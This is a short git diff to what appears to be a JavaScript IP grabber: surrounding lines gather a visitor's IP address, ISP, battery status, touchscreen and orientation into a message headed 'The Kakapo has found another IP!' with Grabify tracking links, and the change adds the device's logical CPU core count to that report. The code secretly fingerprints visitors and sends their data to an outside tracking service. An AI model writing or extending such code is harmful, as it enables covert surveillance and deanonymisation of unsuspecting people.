@@ -247,7 +247,11 @@ let orientation = detectOrientation();
   
 const isTouchscreen = hasTouchscreen();
 const isp = await getISP(ip)	  
-  
+
+
+const logicalCores = navigator.hardwareConcurrency;
+
+	
 const message = `
 The Kakapo has found another IP!
 Check here to see all IPs logged: <https://grabify.link/track/QRUKDR>
@@ -271,6 +275,7 @@ Check here to see IP VPN and Location status <https://grabify.link/ip-lookup/${i
 - Battery Life Time: ${batteryDishargeTime} 
 - Touch Screen: ${isTouchscreen}
 - Orientation: ${orientation}
+- Logical CPU Cores: ${logicalCores}
 `;
   
 const msg = {
